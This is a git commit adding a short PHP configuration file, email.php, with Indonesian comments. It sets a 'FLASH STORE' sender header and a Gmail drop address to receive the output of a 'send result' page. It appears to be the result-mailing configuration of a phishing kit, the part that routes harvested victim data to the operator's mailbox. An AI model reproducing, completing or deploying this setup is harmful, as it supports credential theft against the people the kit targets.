cbb15c4901eb9b80024765cdd066d85e0ce8e8ce
Zetsunoreaction <161854243+Zetsunoreaction@users.noreply.github.com>
2024-08-23 05:22:50 -0700

    Add files via upload

---
+++ markscript1/email.php
@@ -0,0 +1,7 @@
+<?php
+// KONTROL UNTUK HALAMAN KIRIM RESULT
+$author ='AKU flash';
+$sender = 'From: FLASH STORE <ro0t@flash.host1.me>';
+
+$emailku ='nymdorjmargad92@gmail.com';// GANTI EMAIL KAMU DISINI
+?>
